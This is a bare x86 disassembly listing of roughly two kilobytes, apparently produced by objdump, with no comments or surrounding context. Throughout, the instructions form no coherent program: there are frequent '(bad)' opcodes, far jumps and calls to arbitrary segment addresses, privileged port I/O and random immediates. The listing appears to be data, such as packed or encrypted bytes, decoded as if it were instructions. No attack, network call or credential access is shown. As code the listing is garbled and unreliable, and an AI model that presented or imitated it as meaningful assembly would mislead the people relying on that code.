  40abc2:	add    eax,0x560b9b64
  40abc7:	retf   0x6c49
  40abca:	pusha  
  40abcb:	push   edx
  40abcc:	jne    0x40abbf
  40abce:	lea    ecx,[ebp-0x3456f133]
  40abd4:	enter  0x7d60,0x5
  40abd8:	aas    
  40abd9:	arpl   WORD PTR [ecx-0x55d9a9d0],bp
  40abdf:	pcmpgtw mm3,mm7
  40abe2:	pop    ds
  40abe3:	add    dh,0x79
  40abe6:	cmp    al,0xa9
  40abe8:	call   0x6769ab3b
  40abed:	adc    BYTE PTR [edi-0x2a],al
  40abf0:	aad    0xfa
  40abf2:	push   ecx
  40abf3:	xor    esi,DWORD PTR [edx+0x6f866a3d]
  40abf9:	inc    esp
  40abfa:	pusha  
  40abfb:	mov    eax,0xc2cfa992
  40ac00:	int    0x77
  40ac02:	dec    esi
  40ac03:	inc    edi
  40ac04:	dec    esi
  40ac05:	inc    edi
  40ac06:	cmp    bl,BYTE PTR [eax+ebx*1]
  40ac09:	or     eax,0xbd15f14
  40ac0e:	ja     0x40ac0a
  40ac10:	shr    BYTE PTR [esi-0x2e],0xee
  40ac14:	sub    DWORD PTR [ecx],eax
  40ac16:	xor    BYTE PTR [eax+0x0],ch
  40ac19:	jnp    0x40ac49
  40ac1b:	shl    BYTE PTR [edi+0x1d],1
  40ac1e:	inc    ebp
  40ac1f:	dec    esi
  40ac20:	in     al,dx
  40ac21:	inc    esp
  40ac22:	neg    BYTE PTR es:[ebx-0x7cb9a6bb]
  40ac29:	jbe    0x40abd5
  40ac2b:	dec    esp
  40ac2c:	cmp    edx,DWORD PTR [ecx+0x9]
  40ac2f:	sub    cl,BYTE PTR [ebx-0xa8926f0]
  40ac35:	pop    ds
  40ac36:	cmp    al,0xbe
  40ac38:	sub    bl,BYTE PTR [eax+0xbcf185d]
  40ac3e:	rcr    DWORD PTR [eax-0x4dbc6ee8],0x9d
  40ac45:	dec    eax
  40ac46:	mov    dh,BYTE PTR [ecx]
  40ac48:	out    0xec,eax
  40ac4a:	mov    bl,0xa8
  40ac4c:	add    eax,0xdffba2ac
  40ac51:	or     al,0x4e
  40ac53:	adc    DWORD PTR [esi+0x46],esp
  40ac56:	lods   eax,DWORD PTR ds:[esi]
  40ac57:	cli    
  40ac58:	sbb    DWORD PTR [edx+0x23],edx
  40ac5b:	push   ebx
  40ac5c:	rol    BYTE PTR [ebx],0x8e
  40ac5f:	xchg   esp,eax
  40ac60:	mov    edi,0xa7212651
  40ac65:	push   eax
  40ac66:	int3   
  40ac67:	cmp    DWORD PTR ds:0x528790e6,0x1e88e13c
  40ac71:	mov    ecx,0x8eb98a6a
  40ac76:	mov    al,ds:0x7205c39
  40ac7b:	std    
  40ac7c:	cli    
  40ac7d:	jecxz  0x40acb4
  40ac7f:	imul   ecx,DWORD PTR [ecx-0x76eb3279],0xffffff9c
  40ac86:	mov    esp,0x62ab42f2
  40ac8b:	outs   dx,BYTE PTR ds:[esi]
  40ac8c:	pop    ebx
  40ac8d:	mov    eax,0xf0f88f95
  40ac92:	into   
  40ac93:	mov    esi,0xd70509e8
  40ac98:	fbstp  TBYTE PTR [edx]
  40ac9a:	sub    DWORD PTR [ecx-0x60],esp
  40ac9d:	retf   
  40ac9e:	push   ebx
  40ac9f:	imul   edi,DWORD PTR [edx+eiz*1],0x51a08459
  40aca6:	jmp    esi
  40aca8:	dec    esp
  40aca9:	fld    TBYTE PTR ds:0x751135f9
  40acaf:	dec    esp
  40acb0:	or     dl,BYTE PTR [ebx-0x4c]
  40acb3:	inc    ebp
  40acb4:	xchg   esp,eax
  40acb5:	add    al,0xfe
  40acb7:	fldenv ds:0x1b54b682
  40acbd:	test   al,0x7e
  40acbf:	test   al,0xa5
  40acc1:	and    ebx,ecx
  40acc3:	push   ds
  40acc4:	pushf  
  40acc5:	sub    BYTE PTR [ecx-0x4],dh
  40acc8:	mov    ebx,0xd8194796
  40accd:	into   
  40acce:	ds test eax,0xf5c6351c
  40acd4:	jle    0x40ad34
  40acd6:	pop    esp
  40acd7:	jnp    0x40ad43
  40acd9:	mov    ds:0x4447a320,eax
  40acde:	or     al,0x64
  40ace0:	add    BYTE PTR [esp+edi*4],dh
  40ace3:	mov    WORD PTR [edi],es
  40ace5:	push   eax
  40ace6:	repz mov ah,0x20
  40ace9:	lds    esi,FWORD PTR [ecx+0xd]
  40acec:	push   ecx
  40aced:	xchg   edx,eax
  40acee:	sbb    ebx,DWORD PTR [ecx]
  40acf0:	call   0x74eb50b0
  40acf5:	enter  0x4e27,0x61
  40acf9:	sub    al,0xc3
  40acfb:	xchg   ebx,eax
  40acfc:	cs mov ah,0xcf
  40acff:	call   0x161a101d
  40ad04:	or     BYTE PTR ds:0x9d4cfc84,bh
  40ad0a:	xchg   esp,eax
  40ad0b:	fcmovnb st,st(0)
  40ad0d:	xchg   ebx,eax
  40ad0e:	sar    BYTE PTR [ecx+ebp*8-0x4e],cl
  40ad12:	push   ebx
  40ad14:	out    0x45,eax
  40ad16:	xlat   BYTE PTR ds:[ebx]
  40ad17:	in     al,0xa
  40ad19:	ja     0x40ad01
  40ad1b:	ds in  al,dx
  40ad1d:	jle    0x40acbb
  40ad1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad20:	dec    eax
  40ad21:	jp     0x40acd0
  40ad23:	sub    dl,cl
  40ad25:	pop    ecx
  40ad26:	jo     0x40ad22
  40ad28:	sub    ecx,eax
  40ad2a:	sub    esi,esp
  40ad2c:	(bad)  
  40ad2d:	daa    
  40ad2e:	mov    ah,0xaa
  40ad30:	push   0x639a153c
  40ad35:	aaa    
  40ad36:	aam    0x6a
  40ad38:	(bad)  
  40ad39:	mov    bl,bl
  40ad3b:	cld    
  40ad3c:	fistp  QWORD PTR [eax]
  40ad3e:	sbb    al,BYTE PTR [ebx+eax*4-0x7e973ccd]
  40ad45:	dec    ebx
  40ad46:	xor    BYTE PTR ss:[ebx],cl
  40ad49:	cli    
  40ad4a:	cmc    
  40ad4b:	push   ebp
  40ad4c:	push   ds
  40ad4d:	sar    dh,cl
  40ad4f:	or     esp,DWORD PTR [ebp+0x1a70becc]
  40ad55:	or     bh,BYTE PTR [ebp+0x48804e30]
  40ad5b:	and    eax,0xf789e296
  40ad60:	(bad)  
  40ad61:	xlat   BYTE PTR ds:[ebx]
  40ad62:	js     0x40ad71
  40ad64:	jo     0x40ad46
  40ad66:	(bad)  
  40ad67:	cmp    al,BYTE PTR [edx]
  40ad69:	div    BYTE PTR [edx+0x35]
  40ad6c:	and    eax,esp
  40ad6e:	mov    al,0xc5
  40ad70:	dec    esp
  40ad71:	jecxz  0x40acfc
  40ad73:	sub    BYTE PTR [ebp-0x667d04a9],cl
  40ad79:	jnp    0x40ad33
  40ad7b:	lds    esi,FWORD PTR [ecx-0x7b]
  40ad7e:	jmp    0x1c7f:0x3888b52f
  40ad85:	cmp    cl,BYTE PTR [esi+0x1bd2f8c4]
  40ad8b:	dec    ecx
  40ad8c:	test   eax,0xfa0417c3
  40ad91:	clc    
  40ad92:	sub    eax,0xbf21ef6
  40ad97:	aaa    
  40ad98:	mov    ebp,0x114e3076
  40ad9d:	lds    esi,FWORD PTR [eax+0x1b]
  40ada0:	xor    eax,0x2baf70c6
  40ada5:	jmp    0x1457a71b
  40adaa:	cli    
  40adab:	pop    esp
  40adac:	in     eax,0x80
  40adae:	push   0x3977cc45
  40adb3:	or     eax,0x81025cf7
  40adb8:	sbb    ch,BYTE PTR [eax-0x4143fda7]
  40adbe:	clc    
  40adbf:	addr16 ja 0x40ade3
  40adc2:	inc    edi
  40adc3:	mov    bl,BYTE PTR [edi]
  40adc5:	jl     0x40adef
  40adc7:	xor    DWORD PTR [eax-0x77d29db4],ebx
  40adcd:	lock xchg BYTE PTR [ecx+0x74],bh
  40add1:	repnz xor al,0xcc
  40add4:	stos   DWORD PTR es:[edi],eax
  40add5:	and    esp,ebx
  40add7:	test   BYTE PTR [ebx],cl
  40add9:	clc    
  40adda:	inc    ecx
  40addb:	and    al,0x73
  40addd:	xor    ah,cl
  40addf:	sbb    DWORD PTR [ecx+esi*2-0x6def33fd],edi
  40ade6:	ins    BYTE PTR es:[edi],dx
  40ade7:	inc    eax
  40ade8:	inc    edx
  40ade9:	and    eax,DWORD PTR [esi-0x22892817]
  40adef:	retf   0x5eb
  40adf2:	dec    ebp
  40adf3:	xchg   BYTE PTR [edx],cl
  40adf5:	sbb    bh,BYTE PTR [esi]
  40adf7:	xchg   DWORD PTR [eax+0xc7263e7],ecx
  40adfd:	jbe    0x40ae07
  40adff:	mov    ebp,0x7d6929b7
  40ae04:	aam    0x98
  40ae06:	xor    eax,DWORD PTR [esi+0x4bd03852]
  40ae0c:	out    dx,al
  40ae0d:	xchg   ecx,eax
  40ae0e:	aas    
  40ae0f:	and    ecx,esp
  40ae11:	dec    ebx
  40ae12:	shr    edi,cl
  40ae14:	stos   DWORD PTR es:[edi],eax
  40ae15:	js     0x40ae8b
  40ae17:	rcr    BYTE PTR [ebx],1
  40ae19:	mov    bl,BYTE PTR [ebp-0x36]
  40ae1c:	test   al,0xe9
  40ae1e:	sbb    edx,DWORD PTR [esi+0x4304dc8]
  40ae24:	mov    cl,0x78
  40ae26:	(bad)  
  40ae27:	pop    esp
  40ae28:	or     bl,ch
  40ae2a:	xchg   esi,eax
  40ae2b:	imul   eax,DWORD PTR [esi+ebx*8+0x64c92b85],0x266e5229
  40ae36:	stc    
  40ae37:	jl     0x40ae70
  40ae39:	out    0xef,al
  40ae3b:	sahf   
  40ae3c:	xchg   esi,eax
  40ae3d:	(bad)  
  40ae3e:	inc    ebp
  40ae3f:	out    dx,al
  40ae40:	jnp    0x40ae97
  40ae42:	push   ss
  40ae43:	ret    0x508b
  40ae46:	jl     0x40aec1
  40ae48:	jnp    0x40adef
  40ae4a:	inc    ebp
  40ae4b:	jbe    0x40adef
  40ae4d:	push   0x5
  40ae4f:	cli    
  40ae50:	and    BYTE PTR [ebx-0x4c],ch
  40ae53:	out    dx,al
  40ae54:	ret    
  40ae55:	iret   
  40ae56:	jns    0x40ade1
  40ae58:	mov    DWORD PTR [ebx],edx
  40ae5a:	loop   0x40addc
  40ae5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae5d:	dec    edx
  40ae5e:	test   BYTE PTR [ecx-0x55030213],ch
  40ae64:	push   es
  40ae65:	arpl   WORD PTR [edi+0x3f71cd1b],cx
  40ae6b:	mov    dl,0xb9
  40ae6d:	jmp    0x19ca:0xade20a37
  40ae74:	adc    ecx,DWORD PTR gs:[ebp+0x46]
  40ae78:	cmp    DWORD PTR [ecx-0x7f989147],0xffffffa1
  40ae7f:	into   
  40ae80:	imul   ecx,DWORD PTR [ebx+edx*1-0x7d],0xffffff92
  40ae85:	int3   
  40ae86:	adc    edi,edx
  40ae88:	xchg   BYTE PTR ds:0xdabbad8b,dh
  40ae8e:	jmp    0xe35f5368
  40ae93:	pop    edx
  40ae94:	and    DWORD PTR [ebx+0x12],esi
  40ae97:	test   al,0xe
  40ae99:	adc    ecx,ebx
  40ae9b:	xor    DWORD PTR [eax-0x4],ebp
  40ae9e:	mov    BYTE PTR [ebx],dl
  40aea0:	cld    
  40aea1:	mov    BYTE PTR [ebx+eiz*1+0x60],bl
  40aea5:	or     bh,BYTE PTR [edi-0x1c49d40e]
  40aeab:	add    ebp,DWORD PTR [edi]
  40aead:	fwait
  40aeae:	jae    0x40aea0
  40aeb0:	sub    DWORD PTR [edi],0x4eae8756
  40aeb6:	pusha  
  40aeb7:	mov    cl,0x4b
  40aeb9:	lods   al,BYTE PTR ds:[esi]
  40aeba:	xor    DWORD PTR [ebx],esp
  40aebc:	push   0x5
  40aebe:	sub    eax,0x6953d30e
  40aec3:	imul   edi,DWORD PTR [ebx+0x208d3e9d],0xc404537a
  40aecd:	mov    edi,0x1b8cdb09
  40aed2:	fs jb  0x40aea6
  40aed5:	cmp    eax,0x54dadd9a
  40aeda:	mov    WORD PTR [ebx+0x19d01693],cs
  40aee0:	mov    edi,0x8d918f71
  40aee5:	inc    esp
  40aee6:	jge    0x40af43
  40aee8:	div    DWORD PTR [ebx]
  40aeea:	bound  esp,QWORD PTR [ebp+eax*8+0x2]
  40aeee:	stos   BYTE PTR es:[edi],al
  40aeef:	sahf   
  40aef0:	(bad)  
  40aef1:	aam    0x8
  40aef3:	and    esp,DWORD PTR [edi]
  40aef5:	cdq    
  40aef6:	cwde   
  40aef7:	adc    BYTE PTR [ecx+0x4d],bh
  40aefa:	sahf   
  40aefb:	mov    ebp,0xd2e4e64e
  40af00:	pop    esi
  40af02:	xchg   ebp,eax
  40af03:	sub    al,0x7d
  40af05:	jbe    0x40ae95
  40af07:	lea    esi,[esi-0x384239]
  40af0d:	(bad)  
  40af0f:	clc    
  40af10:	sar    DWORD PTR [ecx-0x75d1b086],cl
  40af16:	sahf   
  40af17:	rol    DWORD PTR [edi-0x7ae9e1b5],1
  40af1d:	aas    
  40af1e:	imul   esi,DWORD PTR [ebx-0x2a07b38c],0x6c
  40af25:	mov    BYTE PTR [eax-0x7b],dl
  40af28:	xchg   edx,eax
  40af29:	xchg   esp,eax
  40af2a:	ret    0x2899
  40af2d:	lock push es
  40af2f:	lock cwde 
  40af31:	xchg   DWORD PTR [ebp+eiz*4-0x4b149dfa],ebp
  40af38:	inc    ebx
  40af39:	sub    eax,0x880e18ce
  40af3e:	outs   dx,BYTE PTR ds:[esi]
  40af3f:	mov    DWORD PTR [ebx+0x3e312f74],edi
  40af45:	pusha  
  40af46:	cmc    
  40af47:	bound  eax,QWORD PTR [ecx+0x7ace5e4]
  40af4d:	out    0xaf,eax
  40af4f:	pop    edi
  40af50:	or     al,0x22
  40af53:	neg    DWORD PTR ds:0xd495d83
  40af59:	pop    edi
  40af5a:	mov    eax,ds:0x35fbe6f4
  40af5f:	sbb    ebp,DWORD PTR [eax-0x304600b2]
  40af65:	adc    ebx,ebx
  40af67:	adc    al,0x4d
  40af69:	sub    ebp,DWORD PTR [edi-0x69]
  40af6c:	inc    edx
  40af6d:	adc    eax,0xa88aa245
  40af72:	scas   al,BYTE PTR es:[edi]
  40af73:	mov    cl,0x93
  40af75:	fs push edi
  40af77:	xor    dh,BYTE PTR [esi+esi*8+0x27]
  40af7b:	das    
  40af7c:	hlt    
  40af7d:	gs xchg esp,eax
  40af7f:	xchg   bl,ah
  40af81:	mov    cs,esi
  40af83:	pop    esi
  40af84:	frstor es:[eax-0x228c462f]
  40af8b:	cdq    
  40af8c:	stos   BYTE PTR es:[edi],al
  40af8d:	xor    BYTE PTR [ebx-0x4],cl
  40af90:	icebp  
  40af91:	jb     0x40afad
  40af93:	xor    esp,DWORD PTR [ebx+0x451250a]
  40af99:	stc    
  40af9a:	rcl    BYTE PTR [edx-0x2f315fdc],cl
  40afa0:	xlat   BYTE PTR ds:[ebx]
  40afa1:	stc    
  40afa2:	repz inc edi
  40afa4:	pop    ecx
  40afa5:	push   ds
  40afa6:	inc    ecx
  40afa7:	sbb    dl,BYTE PTR [edx-0x30522f79]
  40afad:	cs push 0xadd2d369
  40afb3:	fisub  WORD PTR [ebp-0x9]
  40afb6:	icebp  
  40afb7:	in     eax,dx
  40afb8:	and    BYTE PTR [edx+0x2b],ch
  40afbb:	xor    BYTE PTR [ebx],dl
  40afbd:	cmp    al,0x24
  40afbf:	retf   0x4237
  40afc2:	retf   0xd306
  40afc5:	fucom  st(3)
  40afc7:	add    ah,dh
  40afc9:	int3   
  40afca:	sub    bh,BYTE PTR [ecx+0x1f]
  40afcd:	cmp    ebx,DWORD PTR [ebx]
  40afcf:	push   ecx
  40afd0:	repnz fwait
  40afd2:	add    al,dl
  40afd4:	shr    DWORD PTR [eax+0x4d],cl
  40afd7:	mov    ds:0xc11cc540,eax
  40afdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afdd:	bound  esp,QWORD PTR [ebx+0xf234f65]
  40afe3:	mov    bl,0x7c
  40afe5:	(bad)  
  40afe6:	jb     0x40af91
  40afe8:	jbe    0x40b05f
  40afea:	fiadd  WORD PTR ds:0x3bf0b247
  40aff0:	jp     0x40af8d
  40aff2:	in     al,dx
  40aff3:	jne    0x40b033
  40aff5:	(bad)  
  40aff6:	mov    bl,0xfe
  40aff8:	mov    ss:0xfb735dd6,eax
  40affe:	sub    BYTE PTR [edi+0x3d],ah
  40b001:	adc    ecx,DWORD PTR [ebp+esi*1-0x2a]
  40b005:	lods   eax,DWORD PTR ds:[esi]
  40b006:	ins    DWORD PTR es:[edi],dx
  40b007:	aaa    
  40b008:	retf   
  40b009:	stos   BYTE PTR es:[edi],al
  40b00a:	fdivr  DWORD PTR [ebx-0x41]
  40b00d:	add    esi,DWORD PTR [edi-0x1d5f0edc]
  40b013:	or     al,0xf3
  40b015:	lock cmp esi,ebp
  40b018:	je     0x40b005
  40b01a:	or     ebp,DWORD PTR [eax+0x742d2ccc]
  40b020:	jae    0x40b07d
  40b022:	lea    edx,[ebx+0xa73133c]
  40b028:	push   esp
  40b029:	(bad)
  40b02d:	mov    bh,0x1
  40b02f:	sbb    DWORD PTR [edx-0x152fc5e5],ecx
  40b035:	retf   0x7bc0
  40b038:	dec    edi
  40b039:	cmp    edi,DWORD PTR [edx+0x79617be5]
  40b03f:	(bad)  
  40b040:	leave  
  40b041:	mov    ds:0x36308d45,eax
  40b046:	(bad)  
  40b047:	adc    BYTE PTR [edx],0x14
  40b04a:	mov    ds:0x8c7de435,al
  40b04f:	nop    DWORD PTR [ecx+0x43]
  40b053:	call   FWORD PTR [edi]
  40b055:	stos   DWORD PTR es:[edi],eax
  40b056:	mov    esp,0x262ca743
  40b05b:	jmp    0xc8eb:0x18717256
  40b062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b063:	mov    eax,ds:0x45c61f67
  40b068:	gs mov eax,0x10c3869c
  40b06e:	xor    ch,BYTE PTR [ebx]
  40b070:	mov    ecx,0xfc07f32
  40b075:	add    dl,ah
  40b077:	nop
  40b078:	push   ds
  40b079:	(bad)  
  40b07a:	bound  ebx,QWORD PTR [eax+0x5]
  40b07d:	rol    dl,1
  40b07f:	test   DWORD PTR [ebx+0x4e],esi
  40b082:	pop    ss
  40b083:	mov    dh,dh
  40b085:	and    BYTE PTR [ebx-0x22],bl
  40b088:	xchg   ecx,eax
  40b089:	frndint 
  40b08b:	push   ebx
  40b08c:	mov    ah,0x86
  40b08e:	sub    ebp,edx
  40b090:	je     0x40b0bf
  40b092:	inc    ebp
  40b093:	stos   DWORD PTR es:[edi],eax
  40b094:	and    BYTE PTR [ecx+esi*2-0x3d],al
  40b098:	or     al,0x43
  40b09b:	inc    edi
  40b09c:	retf   0x9b6b
  40b09f:	jecxz  0x40b02f
  40b0a1:	in     al,dx
  40b0a2:	lods   eax,DWORD PTR ds:[esi]
  40b0a3:	cmp    al,0x97
  40b0a5:	nop
  40b0a6:	bswap  esp
  40b0a8:	jb     0x40b061
  40b0aa:	adc    ah,BYTE PTR [ebp+0x16ff0aeb]
  40b0b0:	mov    dh,0x2d
  40b0b2:	fimul  DWORD PTR [esp+esi*2]
  40b0b5:	in     al,0xa1
  40b0b7:	shl    DWORD PTR [eax-0x56],0x81
  40b0bb:	(bad)
  40b0c1:	jnp    0x40b0ae
  40b0c3:	lahf   
  40b0c4:	inc    edx
  40b0c5:	mov    eax,ds:0x412d6ffa
  40b0ca:	icebp  
  40b0cb:	out    0x88,eax
  40b0cd:	rcl    DWORD PTR gs:[ebp+0x6f20cb30],0xa
  40b0d5:	bound  esi,QWORD PTR [ebx]
  40b0d7:	int    0xc8
  40b0d9:	in     eax,0x34
  40b0db:	fstp   TBYTE PTR ds:0x15ada841
  40b0e1:	pop    edi
  40b0e2:	mov    cl,0x90
  40b0e4:	lea    eax,[eax-0x7f]
  40b0e7:	clc    
  40b0e8:	dec    esi
  40b0e9:	cmovae ebx,esi
  40b0ec:	and    eax,esi
  40b0ee:	jmp    0xcbd6:0x8203bdbe
  40b0f5:	sbb    BYTE PTR [edx],dh
  40b0f7:	sub    eax,0x641b30c4
  40b0fc:	imul   ecx,DWORD PTR [edx-0x12],0x5c
  40b100:	je     0x40b0f4
  40b102:	add    al,0xdb
  40b104:	test   eax,0x26abb8cc
  40b109:	outs   dx,BYTE PTR ds:[esi]
  40b10a:	or     eax,0xad419f84
  40b10f:	sbb    eax,0x3aae05ee
  40b114:	xchg   edx,eax
  40b115:	cwde   
  40b116:	xchg   ecx,eax
  40b117:	test   eax,0xa33bf58d
  40b11c:	and    DWORD PTR [eax],ebp
  40b11e:	sub    DWORD PTR [edx+0x2f719782],ebp
  40b124:	outs   dx,DWORD PTR ds:[esi]
  40b125:	pop    ss
  40b126:	mov    al,ds:0xdb482dad
  40b12b:	sbb    esi,DWORD PTR [edi+ebp*4-0x1f]
  40b12f:	fst    QWORD PTR [esi+esi*2]
  40b132:	cmp    BYTE PTR ds:0xd5fcb4ed,dh
  40b138:	not    ecx
  40b13a:	in     al,0xab
  40b13c:	outs   dx,DWORD PTR ds:[esi]
  40b13d:	mov    ch,0x30
  40b13f:	sbb    al,0x71
  40b141:	adc    BYTE PTR [eax],dh
  40b143:	mov    edx,0xbd3f1af4
  40b148:	cmc    
  40b149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b14a:	in     al,dx
  40b14b:	lods   al,BYTE PTR ds:[esi]
  40b14c:	xor    ah,BYTE PTR [esi+0x49a2c036]
  40b152:	(bad)  
  40b153:	pop    ebx
  40b154:	pop    edx
  40b155:	je     0x40b127
  40b157:	ja     0x40b16b
  40b159:	cmp    dh,BYTE PTR [ebp+0x4f]
  40b15c:	test   BYTE PTR [ebx+ebx*2-0x251b0fa0],dl
  40b163:	rcr    BYTE PTR [ebp-0x2b190301],0xe1
  40b16a:	cmp    al,0xab
  40b16c:	jns    0x40b183
  40b16e:	and    eax,0x6111aadd
  40b173:	inc    esi
  40b174:	int3   
  40b175:	aaa    
  40b176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b177:	push   cs
  40b178:	cmp    eax,DWORD PTR [edi+edx*1-0x50]
  40b17c:	outs   dx,DWORD PTR ds:[esi]
  40b17d:	jb     0x40b1c9
  40b17f:	sub    ah,0xf9
  40b182:	mov    ds:0x69ccffa0,eax
  40b187:	in     al,dx
  40b188:	sub    al,0x63
  40b18a:	in     eax,0x19
  40b18c:	sub    al,al
  40b18e:	mov    bl,0x2
  40b190:	dec    edi
  40b191:	aam    0xbf
  40b193:	xchg   edi,eax
  40b194:	or     bh,BYTE PTR [esi+0x57ffc641]
  40b19a:	mov    ecx,0x338d6fe3
  40b19f:	fwait
  40b1a0:	loope  0x40b1f6
  40b1a2:	push   ebp
  40b1a3:	inc    dh
  40b1a5:	popf   
  40b1a6:	jp     0x40b218
  40b1a8:	sti    
  40b1a9:	aas    
  40b1aa:	imul   edx,DWORD PTR [edi],0x59fa0c6b
  40b1b0:	push   edx
  40b1b1:	and    eax,0x87cb7822
  40b1b6:	inc    esi
  40b1b7:	jb     0x40b216
  40b1b9:	sar    esi,0x1c
  40b1bc:	add    DWORD PTR [esi-0x62],esp
  40b1bf:	mov    al,ds:0xd7a11065
  40b1c4:	fldenv [ebx+edx*2]
  40b1c7:	hlt    
  40b1c8:	mov    edx,0x45eb34f
  40b1cd:	cli    
  40b1ce:	sub    al,0x72
  40b1d0:	add    dl,al
  40b1d2:	or     al,0xb8
  40b1d4:	stos   BYTE PTR es:[edi],al
  40b1d5:	dec    eax
  40b1d6:	addr16 push 0xffffffcb
  40b1d9:	xchg   edi,eax
  40b1da:	sti    
  40b1db:	mov    al,cl
  40b1dd:	cli    
  40b1de:	mov    ebx,0xac42751b
  40b1e3:	loop   0x40b252
  40b1e5:	xor    BYTE PTR [eax+0x1],ah
  40b1e8:	mov    edi,0x4198ac17
  40b1ed:	xchg   ebx,ebp
  40b1ef:	bswap  ebp
  40b1f1:	fsubr  DWORD PTR [ebx]
  40b1f3:	je     0x40b20e
  40b1f5:	ins    DWORD PTR es:[edi],dx
  40b1f6:	fbld   TBYTE PTR [ebp-0x3a6c7c85]
  40b1fc:	inc    ebx
  40b1fd:	stc    
  40b1fe:	and    DWORD PTR [edx+esi*4],edx
  40b201:	jge    0x40b187
  40b203:	dec    ecx
  40b204:	or     edi,eax
  40b206:	push   0x53
  40b208:	mov    bh,0x63
  40b20a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40b20c:	sub    DWORD PTR [edi],0x8a03ec88
  40b212:	or     edx,DWORD PTR [edx+0x2ee45caa]
  40b218:	add    al,0xb1
  40b21a:	ss pop ss
  40b21c:	pop    esp
  40b21d:	out    0xbf,eax
  40b21f:	das    
  40b220:	repz loope 0x40b1e0
  40b223:	dec    ecx
  40b224:	push   ds
  40b225:	(bad)  
  40b226:	dec    esp
  40b227:	out    0x87,al
  40b229:	or     ah,BYTE PTR [eax-0x328dfc34]
  40b22f:	in     al,0x2e
  40b231:	push   edi
  40b232:	jb     0x40b265
  40b234:	test   DWORD PTR [edx-0x3fc34248],esi
  40b23a:	mov    eax,0x9eed7aa9
  40b23f:	inc    esp
  40b240:	mov    DWORD PTR ds:0xdbcaceb6,ebx
  40b246:	mov    ah,0xcc
  40b248:	ds fs aas 
  40b24b:	aam    0xb8
  40b24d:	jnp    0x40b206
  40b24f:	add    al,ch
  40b251:	jl     0x40b218
  40b253:	sahf   
  40b254:	pop    edx
  40b255:	aas    
  40b256:	ret    
  40b257:	mov    ebx,0xff7016b4
  40b25c:	and    ah,bh
  40b25e:	jge    0x40b2cd
  40b260:	out    dx,al
  40b261:	cmp    dh,BYTE PTR [ebp-0x76]
  40b264:	call   0x3cb2aeb
  40b269:	arpl   WORD PTR [edi+0x494a78bf],dx
  40b26f:	jns    0x40b2d3
  40b271:	push   ebp
  40b272:	push   cs
  40b273:	cmp    ah,BYTE PTR [edi-0x7a]
  40b276:	lock in al,dx
  40b278:	cs adc al,0xa3
  40b27b:	(bad)  
  40b27c:	fisub  DWORD PTR ds:0xccd61b6b
  40b282:	sahf   
  40b283:	mov    ds:0xc06aa8c9,eax
  40b288:	loop   0x40b277
  40b28a:	lock sets ah
  40b28e:	pop    ds
  40b28f:	pop    ebp
  40b290:	xchg   ebp,eax
  40b291:	pop    ss
  40b292:	ins    DWORD PTR es:[edi],dx
  40b293:	inc    esp
  40b294:	jns    0x40b21b
  40b296:	sahf   
  40b297:	mov    cl,0x30
  40b299:	xchg   ebp,eax
  40b29a:	pop    es
  40b29b:	adc    eax,DWORD PTR [esi]
  40b29d:	mov    eax,0xe7a24f0c
  40b2a2:	pop    eax
  40b2a3:	cwde   
  40b2a4:	xor    eax,0x95dae68a
  40b2a9:	jge    0x40b269
  40b2ab:	sbb    eax,0xea0092bc
  40b2b0:	out    0xf9,al
  40b2b2:	fdivr  st(0),st
  40b2b4:	inc    edx
  40b2b5:	jno    0x40b329
  40b2b7:	sbb    eax,DWORD PTR [ebx+0x71c0b404]
  40b2bd:	js     0x40b303
  40b2bf:	stos   DWORD PTR es:[edi],eax
  40b2c0:	mov    al,0xf9
  40b2c2:	jae    0x40b30d
  40b2c4:	out    0xeb,al
  40b2c6:	xchg   edx,eax
  40b2c7:	pop    ss
  40b2c8:	enter  0x161d,0xdf
  40b2cc:	xor    ch,BYTE PTR [edi+eiz*4-0x6e332bfc]
  40b2d3:	mov    bh,0x73
  40b2d5:	sub    dl,BYTE PTR [ebp-0x2d]
  40b2d8:	mov    edx,0xf263acc4
  40b2dd:	mov    bl,0x2d
  40b2df:	shl    ebx,cl
  40b2e1:	mov    BYTE PTR [ebx-0x57],ch
  40b2e4:	mov    al,ds:0x994fef5c
  40b2e9:	adc    esp,DWORD PTR ds:0x103d4845
  40b2ef:	push   DWORD PTR [esi]
  40b2f1:	fild   QWORD PTR [ecx]
  40b2f3:	sub    eax,0xa21f836f
  40b2f8:	hlt    
  40b2f9:	mov    dh,BYTE PTR [ecx-0x11]
  40b2fc:	sub    esi,DWORD PTR [eax]
  40b2fe:	push   0x40
  40b300:	add    BYTE PTR [ecx+0x5e],dl
  40b303:	xchg   ebx,eax
  40b304:	add    DWORD PTR [edx+eax*8],eax
  40b307:	inc    eax
  40b308:	call   0xfd125c3e
  40b30d:	mov    esp,0x67392d34
  40b312:	jecxz  0x40b329
  40b314:	test   al,0x3d
  40b316:	clc    
  40b317:	dec    esp
  40b318:	cwde   
  40b319:	xchg   esp,eax
  40b31a:	in     eax,dx
  40b31b:	fist   WORD PTR [ecx+0xdb7d5b0]
  40b321:	push   0x7ee1beb8
  40b326:	ja     0x40b366
  40b328:	es sub eax,0x20073bce
  40b32e:	(bad)  
  40b32f:	push   ss
  40b330:	add    DWORD PTR [ebx-0x14],0xffffffa5
  40b334:	jl     0x40b2e9
  40b336:	sar    DWORD PTR [esi+0x5c866e78],1
  40b33c:	ret    0xe8ca
  40b33f:	ja     0x40b33c
  40b341:	aam    0xb6
  40b343:	rcr    edi,0x68
  40b346:	push   esi
  40b347:	gs test al,0xf9
  40b34a:	push   ss
  40b34b:	fs and eax,0xd9aea076
  40b351:	aad    0x93
  40b353:	pushf  
  40b354:	outs   dx,DWORD PTR ds:[esi]
  40b355:	xchg   ecx,eax
  40b356:	and    BYTE PTR [ebp+0x64be1b84],0x5d
  40b35d:	sbb    eax,0xa676d485
  40b362:	sbb    dh,BYTE PTR [esi]
  40b364:	fimul  DWORD PTR [edi+0x474886dc]
  40b36a:	pop    esp
  40b36b:	aam    0x13
  40b36d:	pop    ss
  40b36e:	fsub   QWORD PTR [ebx]
  40b370:	mov    al,ds:0xa3722f2b
  40b375:	ss je  0x40b37a
  40b378:	sub    eax,0x8938cde7
  40b37d:	bound  eax,QWORD PTR [ebx-0x69244bd3]
